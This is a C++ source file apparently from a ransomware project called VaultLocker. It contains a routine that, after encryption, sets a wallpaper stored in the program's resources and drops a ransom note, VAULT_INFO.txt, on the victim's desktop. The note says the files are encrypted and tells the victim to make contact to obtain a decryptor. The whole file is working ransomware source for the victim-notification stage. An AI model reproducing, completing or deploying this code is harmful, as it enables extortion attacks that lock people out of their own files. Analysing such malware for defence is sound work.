// VAULTLOCKER. 2024
// SERVICES.CPP: CHANGE WALLPAPER, CREATE README

#include <Windows.h>
#include "resource.h"
#include <Shlobj.h>

// SET WALLPAPER AFTER ENCRYPTION AND ADD README.txt TO DESKTOP

bool setDesktopWallpaperFromResource(HINSTANCE hInstance, LPCWSTR resourceName) {
    HRSRC hResInfo = FindResource(hInstance, resourceName, RT_RCDATA);
    if (hResInfo == NULL) {
        return false;
    }

    HGLOBAL hResData = LoadResource(hInstance, hResInfo);
    if (hResData == NULL) {
        return false;
    }

    DWORD dwSize = SizeofResource(hInstance, hResInfo);
    const void* pData = LockResource(hResData);

    TCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    TCHAR tempFile[MAX_PATH];
    GetTempFileName(tempPath, TEXT("wallpaper"), 0, tempFile); // YOUR WALLPAPER FILE NAME

    HANDLE hFile = CreateFile(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hFile, pData, dwSize, &bytesWritten, NULL);
        CloseHandle(hFile);

        if (SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempFile, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
            DeleteFile(tempFile);

            // CREATE README.txt ON DESKTOP

            TCHAR desktopPath[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath))) {
                TCHAR readmeFile[MAX_PATH];
                wsprintf(readmeFile, TEXT("%s\\VAULT_INFO.txt"), desktopPath);

                HANDLE hReadmeFile = CreateFile(readmeFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hReadmeFile != INVALID_HANDLE_VALUE) {
                    const char* readmeContent =
                        "                 V A U L T L O C K E R \n"
                        "  ========== HYBRID CRYPTOSYSTEM FILE LOCKER ==========\n\n"
                        "YOUR FILES HAVE BEEN ENCRYPTED. TO ENSURE THEY CAN BE DECRYPTED CORRECTLY, DO NOT ATTEMPT TO EDIT OR DECRYPT THEM YOURSELF.\n"
                        "FIND YOUR 'ENCRYPTED_KEY.KEY' FILE IN THE DIRECTORY THAT VAULTLOCKER WAS EXECUTED FROM. YOU WILL NEED THIS TO DECRYPT YOUR FILES.\n"
                        "TO OBTAIN YOUR DECRYPTOR PLEASE CONTACT: EXAMPLE@EMAIL.EG";
                    DWORD readmeBytesWritten;
                    WriteFile(hReadmeFile, readmeContent, lstrlenA(readmeContent), &readmeBytesWritten, NULL);
                    CloseHandle(hReadmeFile);

                    return true;
                }
            }
        }
        else {
        }
    }
    else {
    }

    return false;
}
